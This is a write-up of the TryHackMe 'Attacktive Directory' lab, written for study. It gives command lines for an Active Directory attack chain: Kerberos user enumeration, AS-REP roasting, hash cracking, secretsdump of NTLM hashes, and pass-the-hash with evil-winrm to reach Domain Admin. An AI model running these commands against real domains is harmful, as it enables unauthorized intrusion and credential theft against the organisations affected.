# 🛡️ Attacktive Directory Write-up

<p align="center">
  <img src="https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge">
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/Category-Active%20Directory-blue?style=for-the-badge">
</p>

---

## 📌 Overview

* **Room:** Attacktive Directory
* **Domain:** spookysec.local
* **Objective:** Compromise the domain and retrieve all flags

This lab demonstrates a full Active Directory attack chain, leveraging Kerberos misconfigurations, credential exposure, and privilege escalation techniques to achieve Domain Admin access.

---

## 📑 Table of Contents

* [🌐 Initial Enumeration](#-initial-enumeration)
* [🧑‍💻 User Enumeration](#-user-enumeration)
* [🔐 AS-REP Roasting](#-as-rep-roasting)
* [🔓 Hash Cracking](#-hash-cracking)
* [📂 SMB Enumeration](#-smb-enumeration)
* [🔐 Credential Extraction](#-credential-extraction)
* [🧠 Privilege Escalation](#-privilege-escalation)
* [🔑 Pass-the-Hash](#-pass-the-hash)
* [🏁 Flags](#-flags)
* [📚 Key Takeaways](#-key-takeaways)

---

## 🌐 Initial Enumeration

```bash
nmap -sC -sV -p- <target-ip>
```

### 🔍 Findings:

* 88 → Kerberos
* 389 → LDAP
* 445 → SMB
* 139 → NetBIOS
* 3389 → RDP

✔️ Confirmed Active Directory Domain Controller

📸 ![Nmap](screenshots/nmap.png)

---

## 🧑‍💻 User Enumeration

```bash
kerbrute userenum --dc <target-ip> -d spookysec.local userlist.txt
```

### 🔍 Result:

* Valid domain users discovered

📸 ![Kerbrute](screenshots/kerbrute.png)

---

## 🔐 AS-REP Roasting

```bash
impacket-GetNPUsers spookysec.local/ -usersfile user.txt -no-pass -dc-ip <target-ip>
```

### 🎯 Result:

* Retrieved AS-REP hash

📸 ![ASREP](screenshots/asrep.png)

---

## 🔓 Hash Cracking

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

### 🎯 Result:

* Password recovered

📸 ![Hashcat](screenshots/hashcat.png)

---

## 📂 SMB Enumeration

```bash
smbclient -L //<target-ip>/ -U <username>
```

### 🔍 Shares Found:

* ADMIN$
* backup
* IPC$
* NETLOGON
* SYSVOL

📸 ![SMB](screenshots/smb.png)

---

## 🔐 Credential Extraction

```bash
echo "<encoded_string>" | base64 -d
```

### 🎯 Result:

* Found credentials for backup user

📸 ![Decode](screenshots/decode.png)

---

## 🧠 Privilege Escalation

```bash
impacket-secretsdump spookysec.local/backup:<password>@<target-ip>
```

### 🎯 Result:

* Dumped NTLM hashes:

  * Administrator
  * svc-admin
  * backup

📸 ![Secretsdump](screenshots/secretsdump.png)

---

## 🔑 Pass-the-Hash

```bash
evil-winrm -i <target-ip> -u Administrator -H <NTLM-hash>
```

### 🎯 Result:

* Domain Admin access achieved

---

## 🏁 Flags

| User          | Location |
| ------------- | -------- |
| Administrator | Desktop  |
| svc-admin     | Desktop  |
| backup        | Desktop  |

⚠️ Flags hidden for ethical reasons

---

## 🔥 Attack Chain

```
Nmap → Kerbrute → AS-REP → Hashcat → SMB → Decode → Secretsdump → PtH → DA
```

---

## 📚 Key Takeaways

* Kerberos misconfigurations can lead to credential exposure
* AS-REP roasting enables offline password attacks
* Base64 encoding is not secure
* Backup privileges can expose the entire domain
* Pass-the-Hash avoids the need to crack passwords

---

## 🚀 Author

* 💻 cybe07
* 🔗 https://github.com/cybe07

---
